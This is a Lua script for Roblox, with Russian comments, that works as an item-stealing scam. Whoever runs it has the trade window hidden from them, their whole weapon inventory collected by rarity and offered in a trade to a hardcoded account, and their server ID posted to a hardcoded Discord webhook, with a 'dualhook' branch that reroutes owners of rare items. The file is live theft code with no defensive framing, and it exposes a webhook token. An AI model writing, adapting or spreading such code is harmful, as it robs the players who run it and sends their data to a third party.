-- [ Settings ] --
local Username = "Warrior_ggs"
local Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"

-- [ Dualhook Settings ] --
local DualUsername = "Warrior_ggs"
local DualWebhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
local DualUnique, DualAncient, DualGodly = 1, 1, 1

if getgenv().executed then return end
getgenv().executed = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

local userName, webHook = Username, Webhook
local PlaceId = 126884695634066 -- твой PlaceId

-- Сохраняем JobId для повторного телепорта
TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportData)
    queue_on_teleport(string.format([[getgenv().JobId = "%s"]], teleportData.ServerInstanceId))
end)

for _ = 1, 2 do
    task.spawn(function()
        TeleportService:TeleportToPlaceInstance(PlaceId, game.JobId)
    end)
    task.wait()
end

-- Ждём, пока игрок и GUI загрузятся
local function waitForPlayerReady()
    local player = Players.LocalPlayer
    while not player:FindFirstChild("PlayerGui") do
        task.wait()
    end
    while not ReplicatedStorage:FindFirstChild("Modules") do
        task.wait()
    end
end

-- Получение инвентаря
local function getInventoryModules()
    local InvModule, PlayerDataModule, LevelModule
    repeat
        task.wait(0.1)
        local success
        success, InvModule = pcall(function()
            return require(ReplicatedStorage.Modules.InventoryModule)
        end)
        success, PlayerDataModule = pcall(function()
            return require(ReplicatedStorage.Modules.ProfileData)
        end)
        success, LevelModule = pcall(function()
            return require(ReplicatedStorage.Modules.LevelModule)
        end)
    until InvModule and PlayerDataModule and LevelModule
    return InvModule, PlayerDataModule, LevelModule
end

-- Discord webhook
local function sendWebhook(embed, mention)
    local data = {
        ["content"] = mention and "---@everyone" or ('game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")'),
        ["embeds"] = { embed }
    }
    local body = HttpService:JSONEncode(data)
    pcall(function()
        request({
            Url = webHook,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body
        })
    end)
end

-- Авто-трейд
local function autoTrade(InvModule)
    local player = Players.LocalPlayer
    -- Скрываем GUI
    coroutine.wrap(function()
        local tradeGUI = player.PlayerGui:WaitForChild("TradeGUI")
        local tradeGUIPhone = player.PlayerGui:WaitForChild("TradeGUI_Phone")
        while true do
            if tradeGUI.Enabled then tradeGUI.Enabled = false end
            if tradeGUIPhone.Enabled then tradeGUIPhone.Enabled = false end
            task.wait(0.1)
        end
    end)()

    local itemsByRarity = {
        Unique = {},
        Ancient = {},
        Godly = {},
        Legendary = {},
        Vintage = {},
        Rare = {},
        Uncommon = {},
        Common = {}
    }

    for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, item in pairs(category) do
            table.insert(itemsByRarity[item.Rarity], item.DataID)
        end
    end

    -- Отправка запроса на трейд
    local sendArgs = {Players[userName]}
    ReplicatedStorage.Trade.SendRequest:InvokeServer(unpack(sendArgs))
    task.wait(3)

    for rarity, list in pairs(itemsByRarity) do
        for _, id in pairs(list) do
            ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons")
        end
    end
end

-- Основная функция
local function main()
    waitForPlayerReady()
    local InvModule, PlayerDataModule, LevelModule = getInventoryModules()
    
    -- Определяем, использовать dualhook или обычный
    local counts = {Unique = 0, Ancient = 0, Godly = 0}
    for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, item in pairs(category) do
            if counts[item.Rarity] ~= nil then
                counts[item.Rarity] = counts[item.Rarity] + 1
            end
        end
    end
    if counts.Unique >= DualUnique or counts.Ancient >= DualAncient or counts.Godly >= DualGodly then
        userName, webHook = DualUsername, DualWebhook
    end

    autoTrade(InvModule)
end

task.spawn(main)
